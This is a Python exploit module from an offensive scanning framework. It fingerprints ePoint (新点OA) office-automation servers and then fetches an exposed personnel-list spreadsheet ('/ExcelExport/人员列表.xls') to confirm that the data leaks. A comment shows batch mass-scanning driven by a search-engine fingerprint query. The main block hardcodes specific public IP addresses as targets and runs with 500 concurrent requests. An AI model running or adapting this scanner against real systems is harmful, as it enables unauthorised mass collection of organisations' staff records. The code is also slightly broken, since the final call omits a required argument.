# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-20 13:48
import re

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.request.asynchttp import *


# app="新点OA"
# python batch.py -m exploit.web.OA.ePoint.sensitive -cs -fs "app=\"新点OA\""

class Script(BaseScript):
    name = 'ePoint'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.SENSITIVE
        # 编号
        self.bugNumber = ''
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = ['/']
        # exec
        self.execPathList = ['/ExcelExport/人员列表.xls']
        # session
        self.session = session
        # 相关信息
        self.info = ''
        self.twiceAddr = ''

    async def detect(self):
        try:
            for detectPath in self.detectPathList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.text()
                        reContent = re.search(r'\'(.*)\'', text).group(1)
                        if reContent.startswith('..'):
                            reContent = reContent.split('..')[1]
                        url1 = f'http://{self.target}{reContent}' if self.target.startswith(
                            ('http:', 'https:')) is False else f'{self.target}{reContent}'
                        async with self.session.get(url=url1, timeout=self.reqTimeout, verify_ssl=False) as response1:
                            text2 = await response1.text()
                            if 'EpointCommon' in text2:
                                self.flag = True
                                self.twiceAddr = url1
                                tqdm.write(Fore.RED + '[{}] {}'.format('ePoint Finger', url))
                                return {'name': 'ePoint Finger', 'url': url, 'software': 'ePoint'}
        except Exception:
            return None

    async def exec(self):
        try:
            for execPath in self.execPathList:
                url = f'{self.twiceAddr}{execPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        tqdm.write(Fore.RED + '[{}] {}'.format('ePoint Sensitive Information', url))
                        return {'name': 'ePoint Sensitive Information - __VIEWSTATE TEST', 'url': url, 'software': 'ePoint'}
        except Exception:
            return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    import requests
    import hashlib

    # resp = requests.get('http://58.18.167.226:8088/images/favicon.ICO', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)

    semaphore = asyncio.Semaphore(500)
    sc = Script('61.160.80.146:8888', 1)
    l = asyncio.get_event_loop()
    l.run_until_complete(sc.attack(semaphore))
